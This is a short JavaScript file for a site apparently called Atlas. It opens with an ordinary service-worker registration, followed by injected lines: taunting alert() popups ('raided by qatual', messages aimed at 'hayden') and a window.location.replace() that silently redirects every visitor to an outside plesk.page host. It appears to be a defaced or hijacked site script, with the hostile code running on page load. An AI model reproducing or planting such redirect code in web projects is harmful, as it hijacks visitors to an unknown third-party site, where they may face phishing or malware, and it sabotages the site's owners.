(function () {
  if (!navigator.serviceWorker) return;

  navigator.serviceWorker
    .register("/atlas.sw.js", { scope: "/" })
    .catch(function (err) {
      console.error("[Atlas] SW registration failed:", err);
    });
})();

alert("raided by qatual.");
alert("i told you this would happen hayden.");
alert("just tell me you are sorry and ill fix it.");
alert("go use the better site twins :)");
window.location.replace("https://62-84-183-198.plesk.page/")
